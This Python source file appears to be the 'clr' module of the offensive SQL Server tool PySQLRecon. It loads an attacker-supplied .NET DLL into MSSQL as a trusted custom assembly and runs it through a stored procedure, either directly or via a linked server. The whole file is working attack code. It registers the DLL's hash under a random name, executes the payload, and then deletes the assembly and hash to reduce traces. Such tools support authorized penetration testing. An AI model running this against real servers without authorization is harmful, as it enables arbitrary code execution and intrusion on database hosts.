import typer
import string
import random
from pathlib import Path
from hashlib import sha512

from pysqlrecon.lib.exceptions import DuplicateAssemblyError
from pysqlrecon.logger import logger
from pysqlrecon.lib import PySqlRecon

app = typer.Typer()
COMMAND_NAME = "clr"
HELP = "[red][PRIV][/] Load and execute a .NET assembly in a stored procedure [I,L]"
LINK_COMPATIBLE = True
IMPERSONATE_COMPATIBLE = True


@app.callback(invoke_without_command=True)
def main(
    ctx: typer.Context,
    dll: Path = typer.Option(..., "--dll", dir_okay=False, readable=True, help=".NET DLL to load into stored procedure"),
    function: str = typer.Option(..., "--function", help="Function within .NET DLL to execute")):
    
    pysqlrecon: PySqlRecon = ctx.obj['pysqlrecon']

    # verify opts are compatible with module before connecting
    if not PySqlRecon.validate_opts(
        LINK_COMPATIBLE,
        IMPERSONATE_COMPATIBLE,
        pysqlrecon.link,
        pysqlrecon.impersonate
    ):
        exit()

    pysqlrecon.connect()

    # get dll bytes and SHA-512 hash
    dll_bytes = dll.read_bytes().hex()
    dll_hash = sha512(dll.read_bytes()).hexdigest()

    dll_path = ''.join(random.choices(string.ascii_letters, k=8))
    asm_name = ''.join(random.choices(string.ascii_letters, k=8))

    ####
    # Ensure pre-requisites are met
    if pysqlrecon.link is not None:
        logger.info(f"Performing CLR custom assembly attack on {pysqlrecon.link} via {pysqlrecon.target}")
        if not pysqlrecon.linked_check_module("clr enabled"):
            logger.warning(f"CLR integration is not enabled on {pysqlrecon.link}")
            pysqlrecon.disconnect()
            exit()

        if not pysqlrecon.check_rpc_on_link(pysqlrecon.link):
            logger.warning(f"RPC needs to be enabled on {pysqlrecon.link}")
            pysqlrecon.disconnect()
            exit()
    else:
        logger.info(f"Performing CLR custom assembly attack on {pysqlrecon.target}")
        if not pysqlrecon.check_module("clr enabled"):
            logger.warning("CLR integration is not enabled")
            pysqlrecon.disconnect()
            exit()
    
    ####
    # Check if DLL hash already exists in sys.trusted_assemblies
    #   and delete it if it does
    if pysqlrecon.check_asm_hash(dll_hash):
        logger.warning("Assembly hash already exists in sys.trusted_assesmblies")
        logger.info("Dropping existing assembly before continuing")
        pysqlrecon.delete_tasm(dll_hash)

    ####
    # Add the DLL to sys.trusted_assemblies
    pysqlrecon.add_trusted_asm(dll_path, dll_hash)
    if not pysqlrecon.check_asm_hash(dll_hash):
        logger.error("Failed to add trusted assembly")
        pysqlrecon.disconnect()
        exit()

    logger.info(f"Added SHA-512 hash for '{dll.name}' to sys.trusted_assemblies with a random name of '{dll_path}'")
    logger.debug(f"SHA-512 hash of DLL: {dll_hash}")

    # make sure procedure and assembly names are free
    pysqlrecon.delete_tasm_resources(asm_name, function)
    
    logger.info(f"Creating a new custom assembly with the name '{asm_name}'")

    #####
    # Create the custom assembly
    create_assembly(pysqlrecon, asm_name, dll_bytes, function)
    
    if not pysqlrecon.check_assembly(asm_name):
        logger.error("Failed to create custom assembly")
        logger.info("Cleaning up...")
        pysqlrecon.delete_tasm(dll_hash)
        pysqlrecon.delete_tasm_resources(asm_name, function)
        pysqlrecon.disconnect()
        exit()

    ####
    # Create the stored procedure
    logger.info(f"Loading DLL into stored procedure '{function}'")
    pysqlrecon.create_asm_sp(asm_name, function)

    if not pysqlrecon.check_asm_sp(function):
        logger.warning("Unable to load DLL into custom stored procedure")
        logger.info("Cleaning up...")
        pysqlrecon.delete_tasm(dll_hash)
        pysqlrecon.delete_tasm_resources(asm_name, function)
        pysqlrecon.disconnect()
        exit()

    logger.info(f"Created '[{asm_name}].[StoredProcedures].[{function}]'")
    
    ####
    # Execute the stored procedure/assemby
    logger.info("Executing payload...")
    pysqlrecon.exec_asm_sp(f"{function}")

    ####
    # Cleanup!
    logger.info("Cleaning up...")
    pysqlrecon.delete_tasm(dll_hash)
    pysqlrecon.delete_tasm_resources(asm_name, function)

    pysqlrecon.disconnect()


# recursive func to create assembly and handle duplicate assmebly error by deleting and re-creating
#   fix for https://github.com/Tw1sm/PySQLRecon/issues/1
def create_assembly(pysqlrecon, asm_name, dll_bytes, function):
    try:
        pysqlrecon.create_asm(asm_name, dll_bytes)

    except DuplicateAssemblyError as e:
        logger.warning("Duplicate assembly detected - will try to delete and re-create")
        
        pysqlrecon.delete_tasm_resources(e.assembly_name, function)
        logger.info(f"Deleted the offending duplicate assembly '{e.assembly_name}'")

        logger.info(f"Attempting to re-create assembly with name '{asm_name}'")
        pysqlrecon.create_asm(asm_name, dll_bytes)

        